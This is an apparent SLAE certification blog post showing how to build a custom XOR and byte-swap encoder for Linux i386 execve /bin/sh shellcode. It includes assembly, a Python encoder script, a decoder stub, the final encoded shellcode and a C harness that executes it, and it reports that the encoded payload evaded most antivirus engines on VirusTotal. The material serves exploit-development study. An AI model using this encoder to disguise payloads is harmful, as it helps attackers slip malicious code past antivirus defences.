---
title: "Assignment #4: A custom encoder"
tags: [slae, shellcode, encoder, xor, assembler, i386]
comments: true
share: true
order: 4
---

The fourth assignment for SLAE certification is to create a custom encoding
scheme and create a weaponized PoC using che execve-stack assembler code.

The assignment was written on an Ubuntu Linux 18.04, with a Linux kernel 4.15
version.

## The starting payload

We start our weaponized proof of concept from this assembler code

{%highlight assembly%}
; Filename: 	execve.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the default payload for the customer encoder demo. It
; 		will execute "/bin/sh" using execve() system call.

global _start			

section .text

_start:
	xor eax, eax		; init EAX to 0
	push eax		; pushing 0 to the stack to be used as NULL
				; ending character for /bin/sh string
	
	; execve is defined as #define __NR_execve 11 in 
	; /usr/include/i386-linux-gnu/asm/unistd_32.h:
	;
	; system call prototype is: 
        ; int execve(const char *filename, char *const argv[], 
	; 		char *const envp[]);

	push 0x68732f2f		; pushing //bin/sh into the stack
	push 0x6e69622f		; the init double / is for alignment purpose

	mov ebx, esp		; pointer to *filename

	; I will optimize further my execve-stack shellcode. Since I don't care
	; about passing parameters to my shell and to pass the environment
	; pointer, I can initialize to zero both ECX and EDX registers.
	;
	; This will be equivalent to the call: execve("/bin/sh", 0, 0) that it
	; is legit.
	xor ecx, ecx
	xor edx, edx

	mov al, 0xb		; execve = 11
	int 0x80
{%endhighlight%}

This assembler code translates after compilation in this shellcode:

{%highlight sh%}
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

{%endhighlight%}

## The schema

First step is to align this payload so to be a 4 multiple. Let's use \x90 as padding.

{%highlight sh%}
"\x31\xc0\x50\x68"
"\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69"
"\x6e\x89\xe3\x31"
"\xc9\x31\xd2\xb0"
"\x0b\xcd\x80\x90"
{%endhighlight%}

Second step is to XOR this block with a KEY, that is 0xdeadbeef in our case.

{%highlight sh%}
"\xef\x6d\xee\x87"
"\xf1\x82\xcd\x87"
"\xb6\x82\xdc\x86"
"\xb0\x24\x5d\xde"
"\x17\x9c\x6c\x5f"
"\xd5\x60\x3e\x7f"
{%endhighlight%}

We can swap first half and second half of each word

{%highlight sh%}
"\x87\xee\x6d\xef"
"\x87\xcd\x82\xf1"
"\x86\xdc\x82\xb6"
"\xde\x5d\x24\xb0"
"\x5f\x6c\x9c\x17"
"\x7f\x3e\x60\xd5"
{%endhighlight%}

We prepend the payload with the actual number of byte of the shellcode, XOR-ed
with the obfuscation key 0xdeadbeef

We have 24 bytes as payload in our weaponized PoC that turns in \x18 as
hexdecimal. I'll fill a 32 byte register with the payload length, this implies
that this encoding schema has a limitation for payload with size not longer
than 255 bytes.

Filling the register, turn it to "\x18\x18\x18\x18". We then apply the XOR with
0xdeadbeef encoding key and we obtain "\xc6\xb5\xa6\xf7". We then store it
swapped: "\xf7\xa6\xb5\xc6"

The final encoded payload is:

{%highlight sh%}
"\xf7\xa6\xb5\xc6"
"\x87\xee\x6d\xef"
"\x87\xcd\x82\xf1"
"\x86\xdc\x82\xb6"
"\xde\x5d\x24\xb0"
"\x5f\x6c\x9c\x17"
"\x7f\x3e\x60\xd5"
{%endhighlight%}

## Decoding it

Given an encoded payload, the decoding route must be in place to make sure to
revert our strategy.

* take the first dword, and XOR with hardcoded key. An important part here is
  that we don't need to revert the swapping action we did in encoding this first
  value becase on the stack values are stored in a reverse order. So storing into
  the stack, put the value in the correct order and we have just to XOR it back
  to calculate the payload length.
* divide the value stored in AL with 8 and store on EDX the number of words
	the payload is length
* for each of the n dword(s)
	* byte swap the words
	* xor with the encoding key

When we will reach the payload length during iteration we jump to the decoded
value in memory and the payload is executed for us.

## The configurator

Here it is the python script I used to create different C programs containing
different payloads. Please note that I added also a function to change the EGG
value.

{% highlight python %}

#!/usr/bin/env python
import sys, getopt, textwrap, struct
from binascii import unhexlify, hexlify

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"

    return 0

def pad(string):
    ret = string + "\x90" * (4-(len(string)%4))
    return ret

def xor(data, key):
    l = len(key)

    decoded = ""
    for i in range(0, len(data)):
            decoded += chr(data[i] ^ ord(key[i % l]))


    return decoded

def xor_str(a,b):
    result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
    return '{:x}'.format(result) 

def swap(x):
    s=x[6:8] + x[4:6] + x[2:4] + x[0:2]
    return s

def main(argv):

    key = ("\xde\xad\xbe\xef")
    shellcode=("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80")

    try:
        opts, args=getopt.getopt(argv, "h", ["help"])
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=repr(binascii.unhexlify(arg)).strip("'")


    padded_shellcode = pad(shellcode)
    padded_hex=hexlify(padded_shellcode)
    print "after padding:\t" + padded_hex

    shellcode_len=int(len(padded_shellcode))
    print "payload len is:\t"+str(shellcode_len)+" ("+str(hex(shellcode_len))+")"
    ss= '{:x}'.format(shellcode_len)
    shell_len_string = swap(xor_str(ss*4, "deadbeef"))
    print "payload string:\t" + shell_len_string
    

    padded_xor_hex=""
    for i in textwrap.wrap(padded_hex, 8):
        padded_xor_hex+=xor_str(i, "deadbeef")
    print "after_xor:\t" + padded_xor_hex

    padded_xor_swapped=""
    for i in textwrap.wrap(padded_xor_hex, 8):
        padded_xor_swapped+=swap(i)

    print "after swap:\t" + padded_xor_swapped

    final_encoded_payload=shell_len_string +padded_xor_swapped
    print "final payload:\t" + final_encoded_payload

    f=""
    for x in range(0, len(final_encoded_payload), 2):
        f+= "0x"+final_encoded_payload[x:x+2]+", "

    print "NASM:\t\t" + f[:-2]


    return 0

if __name__ == "__main__":
    main(sys.argv[1:])

{% endhighlight %}


## The proof of concept

This is the assembly weaponized PoC. It takes an encoded payload, it decodes it
and then it passes the execution to the extracted code.

{% highlight assembly %}
; Filename: 	dead_decoder.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This shellcode will decode an execve payload encoded using
;		custom schema, with XOR and byte flipping

global _start			

section .text

_start:
	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi]
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; As assumption, the first double word in our shellcode is the XOR
	; encoded payload length
	mov edx, dword [esi + eax]
	xor edx, 0xdeadbeef
	
	add al, 4
	
decode:
	mov ebx, dword [esi+eax]
	inc ecx
	cmp cl, dl
	je short EncodedShellcode

	; shellcode is stored in a reversed way. Let' XOR-it
	xor ebx, 0xdeadbeef

	; Now we have to swap again bytes before saving into memory
	bswap ebx

	mov [edi], ebx
	add edi, 4
	add al, 4
	
	jmp short decode


call_shellcode:
	call decoder
	EncodedShellcode: db 0xf7, 0xa6, 0xb5, 0xc6, 0x87, 0xee, 0x6d, 0xef, 0x87, 0xcd, 0x82, 0xf1, 0x86, 0xdc, 0x82, 0xb6, 0xde, 0x5d, 0x24, 0xb0, 0x5f, 0x6c, 0x9c, 0x17, 0x7f, 0x3e, 0x60, 0xd5
{% endhighlight %}

Dumping the shellcode I obtained:

{%highlight sh %}
"\xeb\x2f\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8b\x14\x06\x81\xf2\xef\xbe\xad\xde\x04\x04\x8b\x1c\x06\x41\x38\xd1\x74\x16\x81\xf3\xef\xbe\xad\xde\x0f\xcb\x89\x1f\x83\xc7\x04\x04\x04\xeb\xe7\xe8\xcc\xff\xff\xff\xf7\xa6\xb5\xc6\x87\xee\x6d\xef\x87\xcd\x82\xf1\x86\xdc\x82\xb6\xde\x5d\x24\xb0\x5f\x6c\x9c\x17\x7f\x3e\x60\xd5";

{%endhighlight %}

I added this shellcode into the same C program used in previous assignments to
test our shellcode and I executed it in order to check the payload is correct.

{%highlight c%}
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2f\x5e\x8d\x3e\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x8b\x14\x06\x81\xf2\xef\xbe\xad\xde\x04\x04\x8b\x1c\x06\x41\x38\xd1\x74\x16\x81\xf3\xef\xbe\xad\xde\x0f\xcb\x89\x1f\x83\xc7\x04\x04\x04\xeb\xe7\xe8\xcc\xff\xff\xff\xf7\xa6\xb5\xc6\x87\xee\x6d\xef\x87\xcd\x82\xf1\x86\xdc\x82\xb6\xde\x5d\x24\xb0\x5f\x6c\x9c\x17\x7f\x3e\x60\xd5";

		       
int main(int argc, char **argv)
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

{% endhighlight %}


## Virus Total

To prove my encoder on a real test bed, I used VirusTotal portal. Here it is
the
[analysis](https://www.virustotal.com/#/file/0aa7dd9033f2309fe53dfcfea6240533d788e108c7309ca7a9d27da87ea9de3e/detection).

As you may see, only 6 antivirus out of 59 detects the weaponized code as
malicious.

![Virus Total]({{site.url}}/assets/images/slae_encoding_comparison.png)

## Code in action

Here you can find the custom encoder weaponized code in action.

{% asciicast 194068 %}


## SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1217

